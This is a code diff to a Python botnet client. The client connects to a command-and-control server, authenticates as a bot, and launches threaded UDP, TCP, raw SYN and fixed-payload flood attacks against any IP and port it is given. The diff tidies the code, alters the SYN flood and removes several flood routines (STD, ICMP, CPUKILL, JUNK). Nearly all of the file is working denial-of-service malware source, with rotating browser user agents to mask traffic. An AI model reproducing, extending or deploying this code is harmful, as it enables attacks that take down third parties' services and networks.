@@ -1,14 +1,14 @@
-import socket 
+import socket
 import threading
 import time
 import random
 
-C2_ADDRESS  = "127.0.0.1"
-C2_PORT     = 6667
+C2_ADDRESS = "127.0.0.1"
+C2_PORT = 6667
 
 base_user_agents = [
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f',
+    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
     'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
@@ -844,7 +844,6 @@ base_user_agents = [
     'Mozilla/5.0 (X11; CrOS armv7l 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36',
     'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35',
-    'http://www.useragentstring.com/Firefox25.0_id_19710.php',
     'Mozilla/5.0 (Linux; Android 4.4.2; SM-T330NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
     'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A8426 Safari/8536.25',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
@@ -1014,59 +1013,44 @@ base_user_agents = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4',
 ]
 
+
 def rand_ua():
-    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+    return random.choice(base_user_agents) % (
+        random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100),
+        random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
+
 
 def attack_udp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
+        dest_port = random.randint(1, 65535) if port == 0 else port
+        addr = (str(ip), int(dest_port))
+        try:
+            data = random._urandom(size)
+            s.sendto(data, addr)
+        except:
+            s.close()
+
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((ip, port))
-            while time.time() < secs:
-                s.send(random._urandom(size))
+            s.send(random._urandom(size))
         except:
-            pass
+            s.close()
+
 
 def attack_syn(ip, port, secs):
     while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.setblocking(0)
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         try:
-            dport = random.randint(1, 65535) if port == 0 else port
-            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
+            dest_port = random.randint(1, 65535) if port == 0 else port
+            s.connect((ip, dest_port))
         except:
-            pass
+            s.close()
 
-def attack_std(ip, port, secs):
-    payload = b'\x73\x74\x64\x00\x00\x00\x00\x00\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-
-def attack_icmp(ip, port, secs, size):
-    payload = b'\x08\x00\xbd\xcb\x16\x4f\x00\x01\x92\xde\xe2\x50\x00\x00\x00\x00\xe1\xe1\x0e\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
 
 def attack_hex(ip, port, secs):
     payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
@@ -1079,63 +1063,35 @@ def attack_hex(ip, port, secs):
         s.sendto(payload, (ip, port))
         s.sendto(payload, (ip, port))
 
-def attack_cpukill(ip, port, secs):
-    payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-
-def attack_junk(ip, port, secs):
-    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
 
 def main():
     c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    while 1:
+    while True:
         try:
             c2.connect((C2_ADDRESS, C2_PORT))
-            while 1:
+            print("Connected.")
+            while True:
                 data = c2.recv(1024).decode()
                 if 'Username' in data:
                     c2.send('BOT'.encode())
                     break
-            while 1:
+            while True:
                 data = c2.recv(1024).decode()
                 if 'Password' in data:
                     c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                     break
             break
         except:
-            time.sleep(90)
-    while 1:
+            time.sleep(10)
+    while True:
         try:
             data = c2.recv(1024).decode().strip()
             if not data:
                 break
             args = data.split(' ')
             command = args[0].upper()
-            if command == '.ICMP':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
-            elif command == '.UDP':
+            if command == '.UDP':
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
@@ -1170,14 +1126,6 @@ def main():
                 for _ in range(threads):
                     threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
-            elif command == '.STD':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_std, args=(ip, port, secs), daemon=True).start()
             elif command == '.HEX':
                 ip = args[1]
                 port = int(args[2])
@@ -1186,26 +1134,7 @@ def main():
 
                 for _ in range(threads):
                     threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
-            elif command == '.CPUKILL':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
 
-                for _ in range(threads):
-                    threading.Thread(target=attack_cpukill, args=(ip, port, secs), daemon=True).start()
-            elif command == '.JUNK':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-
-                for _ in range(threads):
-                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
-                for _ in range(threads):
-                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-                    threading.Thread(target=attack_icmp, args=(ip, port, secs), daemon=True).start()
             elif command == 'PING':
                 c2.send('PONG'.encode())
 
@@ -1215,6 +1144,7 @@ def main():
     c2.close()
 
     main()
+
 
 if __name__ == '__main__':
     try:
